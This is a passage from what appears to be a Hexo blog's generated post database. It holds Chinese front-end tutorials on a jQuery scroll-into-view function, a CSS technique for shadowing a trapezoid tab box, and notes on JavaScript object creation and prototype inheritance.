class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ul&#123;</span><br><span class=\"line\">    postion:relative;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"动态创建完dom结构后调用函数\"><a href=\"#动态创建完dom结构后调用函数\" class=\"headerlink\" title=\"动态创建完dom结构后调用函数\"></a>动态创建完dom结构后调用函数</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function setSelectedInView()&#123;</span><br><span class=\"line\">    $(&apos;.J-item.selected&apos;).each(function()&#123;</span><br><span class=\"line\">        var $this = $(this);</span><br><span class=\"line\">        if($this.length &gt; 0)&#123;</span><br><span class=\"line\">            var $item = $this.parent(),</span><br><span class=\"line\">                itemHeight = $item.outerHeight(),</span><br><span class=\"line\">                itemTop = $item.position().top;</span><br><span class=\"line\">            var $container = $item.parent(&apos;.J-items&apos;),</span><br><span class=\"line\">                containerHeight = $container.height();</span><br><span class=\"line\">            // 如果该条目元素相对于父级的位置超出可视框高度，设置滚动条</span><br><span class=\"line\">            if(itemTop &gt; containerHeight)&#123;</span><br><span class=\"line\">                $container.scrollTop(itemTop - containerHeight + itemHeight);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"多边形，梯形盒阴影css实现技巧","date":"2018-04-09T09:26:21.000Z","_content":"\n# 概述\n一般情况下，我们给块状元素（四边形）添加阴影样式，直接用css`box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1);`就可以了，但是总有一些需求是那么的特别，例如下图：\n\n![梯形盒阴影图](1.jpg)\n\n要求给这样的梯形盒外围加阴影，第一眼感觉也没啥特别的，但是搞起来就知道多烦了。反正我是折腾了好一会儿，最后只能用下面这样实现了。\n<!-- more -->\n# 详述\n## HTML和CSS（sass）代码：\n\n```html\n    <div class=\"m-tab-page-box cf\">\n        <div class=\"m-tab-page\">\n            <a class=\"m-page-item\" href=\"\">Set Physical Presence </a>\n            <a class=\"m-page-item current\" href=\"\">Set Prodcut Tax Code </a>\n        </div>\n        <div class=\"m-tab-page-cover\"></div>\n    </div>\n\n    <div class=\"tab-search-block\">\n        <div style=\"height: 160px;\"></div>\n    </div>\n```\n\n```css\n.m-tab-page-box{\n    position: relative;\n}\n.m-tab-page-cover{\n    width: 100%;\n    height: 3px;\n    background: #fff;\n    position: absolute;\n    bottom: -3px;\n}\n.m-tab-page {\n    float: left;\n    border-bottom: none;\n    margin-bottom: 0;\n    display: inline-block;\n    box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1);\n    height: 38px;\n\n    .m-page-item {\n        display: block;\n        padding: 10px 20px;\n        float: left;\n        color: #222;\n        font-weight: bold;\n        margin-bottom: 0;\n        background: #edf0f2;\n\n        &.current {\n            background: #fff;\n            border: none;\n\n        }\n    }\n\n}\n\n.tab-search-block{\n    background: #fff;\n    box-shadow: 0 1px 3px 0px rgba(0, 0, 0, 0.1);\n    margin-bottom: 20px;\n\n}\n```\n## 实现思路：\n'.m-tab-page'设成行内元素，加阴影，'.tab-search-block'加阴影，**重点**是在'.m-tab-page-box'中添加一个'.m-tab-page-cover'，该元素的作用就是遮住'.m-tab-page'元素的底部阴影，注意'.m-tab-page-cover'的高度为盒阴影扩散的距离。\n\n# 后记\n如果哪位有更好的思路，烦请留言说下啊。","source":"_posts/2018/梯形盒阴影.md","raw":"---\ntitle: 多边形，梯形盒阴影css实现技巧\ndate: 2018-04-09 17:26:21\ntags:\n- CSS\ncategories: \n- 前端\n---\n\n# 概述\n一般情况下，我们给块状元素（四边形）添加阴影样式，直接用css`box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1);`就可以了，但是总有一些需求是那么的特别，例如下图：\n\n![梯形盒阴影图](1.jpg)\n\n要求给这样的梯形盒外围加阴影，第一眼感觉也没啥特别的，但是搞起来就知道多烦了。反正我是折腾了好一会儿，最后只能用下面这样实现了。\n<!-- more -->\n# 详述\n## HTML和CSS（sass）代码：\n\n```html\n    <div class=\"m-tab-page-box cf\">\n        <div class=\"m-tab-page\">\n            <a class=\"m-page-item\" href=\"\">Set Physical Presence </a>\n            <a class=\"m-page-item current\" href=\"\">Set Prodcut Tax Code </a>\n        </div>\n        <div class=\"m-tab-page-cover\"></div>\n    </div>\n\n    <div class=\"tab-search-block\">\n        <div style=\"height: 160px;\"></div>\n    </div>\n```\n\n```css\n.m-tab-page-box{\n    position: relative;\n}\n.m-tab-page-cover{\n    width: 100%;\n    height: 3px;\n    background: #fff;\n    position: absolute;\n    bottom: -3px;\n}\n.m-tab-page {\n    float: left;\n    border-bottom: none;\n    margin-bottom: 0;\n    display: inline-block;\n    box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1);\n    height: 38px;\n\n    .m-page-item {\n        display: block;\n        padding: 10px 20px;\n        float: left;\n        color: #222;\n        font-weight: bold;\n        margin-bottom: 0;\n        background: #edf0f2;\n\n        &.current {\n            background: #fff;\n            border: none;\n\n        }\n    }\n\n}\n\n.tab-search-block{\n    background: #fff;\n    box-shadow: 0 1px 3px 0px rgba(0, 0, 0, 0.1);\n    margin-bottom: 20px;\n\n}\n```\n## 实现思路：\n'.m-tab-page'设成行内元素，加阴影，'.tab-search-block'加阴影，**重点**是在'.m-tab-page-box'中添加一个'.m-tab-page-cover'，该元素的作用就是遮住'.m-tab-page'元素的底部阴影，注意'.m-tab-page-cover'的高度为盒阴影扩散的距离。\n\n# 后记\n如果哪位有更好的思路，烦请留言说下啊。","slug":"2018-梯形盒阴影","published":1,"updated":"2019-05-17T02:46:08.752Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8ux0042wovvj34q6e12","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>一般情况下，我们给块状元素（四边形）添加阴影样式，直接用css<code>box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1);</code>就可以了，但是总有一些需求是那么的特别，例如下图：</p>\n<p><img src=\"/2018-梯形盒阴影/1.jpg\" alt=\"梯形盒阴影图\"></p>\n<p>要求给这样的梯形盒外围加阴影，第一眼感觉也没啥特别的，但是搞起来就知道多烦了。反正我是折腾了好一会儿，最后只能用下面这样实现了。<br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"HTML和CSS（sass）代码：\"><a href=\"#HTML和CSS（sass）代码：\" class=\"headerlink\" title=\"HTML和CSS（sass）代码：\"></a>HTML和CSS（sass）代码：</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"m-tab-page-box cf\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"m-tab-page\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">\"m-page-item\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>Set Physical Presence <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">\"m-page-item current\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>Set Prodcut Tax Code <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"m-tab-page-cover\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"tab-search-block\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"height: 160px;\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.m-tab-page-box</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.m-tab-page-cover</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">    <span class=\"attribute\">bottom</span>: -<span class=\"number\">3px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.m-tab-page</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">    <span class=\"attribute\">border-bottom</span>: none;</span><br><span class=\"line\">    <span class=\"attribute\">margin-bottom</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: inline-block;</span><br><span class=\"line\">    <span class=\"attribute\">box-shadow</span>: <span class=\"number\">0</span> <span class=\"number\">1px</span> <span class=\"number\">3px</span> <span class=\"number\">0</span> <span class=\"built_in\">rgba</span>(0, 0, 0, 0.1);</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">38px</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    .m-page-item &#123;</span><br><span class=\"line\">        <span class=\"selector-tag\">display</span>: <span class=\"selector-tag\">block</span>;</span><br><span class=\"line\">        <span class=\"selector-tag\">padding</span>: 10<span class=\"selector-tag\">px</span> 20<span class=\"selector-tag\">px</span>;</span><br><span class=\"line\">        <span class=\"selector-tag\">float</span>: <span class=\"selector-tag\">left</span>;</span><br><span class=\"line\">        <span class=\"selector-tag\">color</span>: <span class=\"selector-id\">#222</span>;</span><br><span class=\"line\">        <span class=\"selector-tag\">font-weight</span>: <span class=\"selector-tag\">bold</span>;</span><br><span class=\"line\">        <span class=\"selector-tag\">margin-bottom</span>: 0;</span><br><span class=\"line\">        <span class=\"selector-tag\">background</span>: <span class=\"selector-id\">#edf0f2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &amp;<span class=\"selector-class\">.current</span> &#123;</span><br><span class=\"line\">            <span class=\"attribute\">background</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">            <span class=\"attribute\">border</span>: none;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.tab-search-block</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">    <span class=\"attribute\">box-shadow</span>: <span class=\"number\">0</span> <span class=\"number\">1px</span> <span class=\"number\">3px</span> <span class=\"number\">0px</span> <span class=\"built_in\">rgba</span>(0, 0, 0, 0.1);</span><br><span class=\"line\">    <span class=\"attribute\">margin-bottom</span>: <span class=\"number\">20px</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"实现思路：\"><a href=\"#实现思路：\" class=\"headerlink\" title=\"实现思路：\"></a>实现思路：</h2><p>‘.m-tab-page’设成行内元素，加阴影，’.tab-search-block’加阴影，<strong>重点</strong>是在’.m-tab-page-box’中添加一个’.m-tab-page-cover’，该元素的作用就是遮住’.m-tab-page’元素的底部阴影，注意’.m-tab-page-cover’的高度为盒阴影扩散的距离。</p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>如果哪位有更好的思路，烦请留言说下啊。</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>一般情况下，我们给块状元素（四边形）添加阴影样式，直接用css<code>box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1);</code>就可以了，但是总有一些需求是那么的特别，例如下图：</p>\n<p><img src=\"/2018-梯形盒阴影/1.jpg\" alt=\"梯形盒阴影图\"></p>\n<p>要求给这样的梯形盒外围加阴影，第一眼感觉也没啥特别的，但是搞起来就知道多烦了。反正我是折腾了好一会儿，最后只能用下面这样实现了。<br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"HTML和CSS（sass）代码：\"><a href=\"#HTML和CSS（sass）代码：\" class=\"headerlink\" title=\"HTML和CSS（sass）代码：\"></a>HTML和CSS（sass）代码：</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"m-tab-page-box cf\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"m-tab-page\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">\"m-page-item\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>Set Physical Presence <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">\"m-page-item current\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>Set Prodcut Tax Code <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"m-tab-page-cover\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"tab-search-block\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"height: 160px;\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.m-tab-page-box</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.m-tab-page-cover</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">    <span class=\"attribute\">bottom</span>: -<span class=\"number\">3px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.m-tab-page</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">    <span class=\"attribute\">border-bottom</span>: none;</span><br><span class=\"line\">    <span class=\"attribute\">margin-bottom</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: inline-block;</span><br><span class=\"line\">    <span class=\"attribute\">box-shadow</span>: <span class=\"number\">0</span> <span class=\"number\">1px</span> <span class=\"number\">3px</span> <span class=\"number\">0</span> <span class=\"built_in\">rgba</span>(0, 0, 0, 0.1);</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">38px</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    .m-page-item &#123;</span><br><span class=\"line\">        <span class=\"selector-tag\">display</span>: <span class=\"selector-tag\">block</span>;</span><br><span class=\"line\">        <span class=\"selector-tag\">padding</span>: 10<span class=\"selector-tag\">px</span> 20<span class=\"selector-tag\">px</span>;</span><br><span class=\"line\">        <span class=\"selector-tag\">float</span>: <span class=\"selector-tag\">left</span>;</span><br><span class=\"line\">        <span class=\"selector-tag\">color</span>: <span class=\"selector-id\">#222</span>;</span><br><span class=\"line\">        <span class=\"selector-tag\">font-weight</span>: <span class=\"selector-tag\">bold</span>;</span><br><span class=\"line\">        <span class=\"selector-tag\">margin-bottom</span>: 0;</span><br><span class=\"line\">        <span class=\"selector-tag\">background</span>: <span class=\"selector-id\">#edf0f2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &amp;<span class=\"selector-class\">.current</span> &#123;</span><br><span class=\"line\">            <span class=\"attribute\">background</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">            <span class=\"attribute\">border</span>: none;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.tab-search-block</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">    <span class=\"attribute\">box-shadow</span>: <span class=\"number\">0</span> <span class=\"number\">1px</span> <span class=\"number\">3px</span> <span class=\"number\">0px</span> <span class=\"built_in\">rgba</span>(0, 0, 0, 0.1);</span><br><span class=\"line\">    <span class=\"attribute\">margin-bottom</span>: <span class=\"number\">20px</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"实现思路：\"><a href=\"#实现思路：\" class=\"headerlink\" title=\"实现思路：\"></a>实现思路：</h2><p>‘.m-tab-page’设成行内元素，加阴影，’.tab-search-block’加阴影，<strong>重点</strong>是在’.m-tab-page-box’中添加一个’.m-tab-page-cover’，该元素的作用就是遮住’.m-tab-page’元素的底部阴影，注意’.m-tab-page-cover’的高度为盒阴影扩散的距离。</p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>如果哪位有更好的思路，烦请留言说下啊。</p>"},{"title":"面向对象的程序设计（《JavaScript高级程序设计》）","date":"2019-01-10T09:46:55.000Z","updated":"2019-01-10T09:46:55.000Z","_content":"\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n\n面向对象的程序设计：理解对象，创建对象，继承。\n\n<!-- more -->\n\n# 详述\n\n## 对象\n\n无序属性的集合，其属性可以包含基本值、对象或者函数。\n\n### 属性\n\n1. 数据属性\n\n- [[Configurable]]：表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特性，或者能否把属性修改为访问器属性。像前面例子中那样直接在对象上定义的属性，它们的这个特性默认值为 true。\n- [[Enumerable]]：表示能否通过 for-in 循环返回属性。像前面例子中那样直接在对象上定义的属性，它们的这个特性默认值为 true。\n- [[Writable]]：表示能否修改属性的值。像前面例子中那样直接在对象上定义的属性，它们的这个特性默认值为 true。\n- [[Value]]：包含这个属性的数据值。读取属性值的时候，从这个位置读；写入属性值的时候，把新值保存在这个位置。这个特性的默认值为 undefined。\n\n2. 访问器属性\n\n- [[Configurable]]：表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特性，或者能否把属性修改为数据属性。对于直接在对象上定义的属性，这个特性的默认值为 true。\n- [[Enumerable]]：表示能否通过 for-in 循环返回属性。对于直接在对象上定义的属性，这个特性的默认值为 true。\n- [[Get]]：在读取属性时调用的函数。默认值为 undefined。\n- [[Set]]：在写入属性时调用的函数。默认值为 undefined。\n  访问器属性不能直接定义，必须使用 Object.defineProperty()来定义。\n\n### 读取属性特性\n\n方法：`var descriptorObj = Object.getOwnPropertyDescriptor(obj, property);`\n\n\n## 创建对象\n\n### 构造函数模式\n\n```js\nfunction Person(name, age, job) {\n  this.name = name;\n  this.age = age;\n  this.job = job;\n  this.sayName = function() {\n    alert(this.name);\n  };\n}\nvar person1 = new Person(\"Nicholas\", 29, \"Software Engineer\");\nvar person2 = new Person(\"Greg\", 27, \"Doctor\");\nalert(person1.sayName == person2.sayName); //false\n```\n\n### 原型模式\n\n```js\nfunction Person() {}\nPerson.prototype.name = \"Nicholas\";\nPerson.prototype.age = 29;\nPerson.prototype.job = \"Software Engineer\";\nPerson.prototype.sayName = function() {\n  alert(this.name);\n};\nvar person1 = new Person();\nperson1.sayName(); //\"Nicholas\"\nvar person2 = new Person();\nperson2.sayName(); //\"Nicholas\"\nalert(person1.sayName == person2.sayName); //true\n```\n\n同时使用 hasOwnProperty()方法和 in 操作符，就可以确定该属性到底是存在于对象中，还是存在于\n原型中\n\n```js\nfunction hasPrototypeProperty(object, name) {\n  return !object.hasOwnProperty(name) && name in object;\n}\n```\n\n### 组合使用构造函数模式和原型模式(**推荐模式**)\n\n```js\nfunction Person(name, age, job) {\n  this.name = name;\n  this.age = age;\n  this.job = job;\n  this.friends = [\"Shelby\", \"Court\"];\n}\nPerson.prototype = {\n  constructor: Person,\n  sayName: function() {\n    alert(this.name);\n  }\n};\nvar person1 = new Person(\"Nicholas\", 29, \"Software Engineer\");\nvar person2 = new Person(\"Greg\", 27, \"Doctor\");\nperson1.friends.push(\"Van\");\nalert(person1.friends); //\"Shelby,Count,Van\"\nalert(person2.friends); //\"Shelby,Count\"\nalert(person1.friends === person2.friends); //false\nalert(person1.sayName === person2.sayName); //true\n```\n\n## 继承\n\n### 原型链\n\n```js\nfunction SuperType() {\n  this.property = true;\n}\nSuperType.prototype.getSuperValue = function() {\n  return this.property;\n};\nfunction SubType() {\n  this.subproperty = false;\n}\n//继承了SuperType\nSubType.prototype = new SuperType();\nSubType.prototype.getSubValue = function() {\n  return this.subproperty;\n};\nvar instance = new SubType();\nalert(instance.getSuperValue()); //true\n```\n\n![原型链关系图](1.jpg)\n\n### 组合继承（**最常用**）\n\n```js\nfunction SuperType(name) {\n  this.name = name;\n  this.colors = [\"red\", \"blue\", \"green\"];\n}\nSuperType.prototype.sayName = function() {\n  alert(this.name);\n};\nfunction SubType(name, age) {\n  //继承属性\n  SuperType.call(this, name);\n  this.age = age;\n}\n//继承方法\nSubType.prototype = new SuperType();\nSubType.prototype.constructor = SubType;\nSubType.prototype.sayAge = function() {\n  alert(this.age);\n};\nvar instance1 = new SubType(\"Nicholas\", 29);\ninstance1.colors.push(\"black\");\nalert(instance1.colors); //\"red,blue,green,black\"\ninstance1.sayName(); //\"Nicholas\";\ninstance1.sayAge(); //29\nvar instance2 = new SubType(\"Greg\", 27);\nalert(instance2.colors); //\"red,blue,green\"\ninstance2.sayName(); //\"Greg\";\ninstance2.sayAge(); //27\n```\n\n### 原型式继承\n\n```js\nfunction object(o) {\n  function F() {}\n  F.prototype = o;\n  return new F();\n}\nvar person = {\nname: \"Nicholas\",\nfriends: [\"Shelby\", \"Court\", \"Van\"]\n};\nvar anotherPerson = object(person);\nanotherPerson.name = \"Greg\";\nanotherPerson.friends.push(\"Rob\");\nvar yetAnotherPerson = object(person);\nyetAnotherPerson.name = \"Linda\";\nyetAnotherPerson.friends.push(\"Barbie\");\nalert(person.friends); //\"Shelby,Court,Van,Rob,Barbie\"\n\n// ES5 Object.create()实现\nvar person = {\nname: \"Nicholas\",\nfriends: [\"Shelby\", \"Court\", \"Van\"]\n};\nvar anotherPerson = Object.create(person);\nanotherPerson.name = \"Greg\";\nanotherPerson.friends.push(\"Rob\");\nvar yetAnotherPerson = Object.create(person);\nyetAnotherPerson.name = \"Linda\";\nyetAnotherPerson.friends.push(\"Barbie\");\nalert(person.friends); //\"Shelby,Court,Van,Rob,Barbie\"\n```\n\n### 寄生组合式继承（**最理想**）\n\n```js\nfunction object(o) {\n  function F() {}\n  F.prototype = o;\n  return new F();\n}\nfunction inheritPrototype(subType, superType) {\n  var prototype = object(superType.prototype); //创建对象\n  prototype.constructor = subType; //增强对象\n  subType.prototype = prototype; //指定对象\n}\nfunction SuperType(name) {\n  this.name = name;\n  this.colors = [\"red\", \"blue\", \"green\"];\n}\nSuperType.prototype.sayName = function() {\n  alert(this.name);\n};\nfunction SubType(name, age) {\n  SuperType.call(this, name);\n  this.age = age;\n}\ninheritPrototype(SubType, SuperType);\nSubType.prototype.sayAge = function() {\n  alert(this.age);\n};\n```\n","source":"_posts/2019/01/2019-01-10-JS高设3版-6.md","raw":"---\ntitle: 面向对象的程序设计（《JavaScript高级程序设计》）\ntags:\n  - JavaScript\n  - 笔记\ncategories:\n  - 前端\ndate: 2019-01-10 17:46:55\nupdated: 2019-01-10 17:46:55\n---\n\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n\n面向对象的程序设计：理解对象，创建对象，继承。\n\n<!-- more -->\n\n# 详述\n\n## 对象\n\n无序属性的集合，其属性可以包含基本值、对象或者函数。\n\n### 属性\n\n1. 数据属性\n\n- [[Configurable]]：表示能否通过 delete 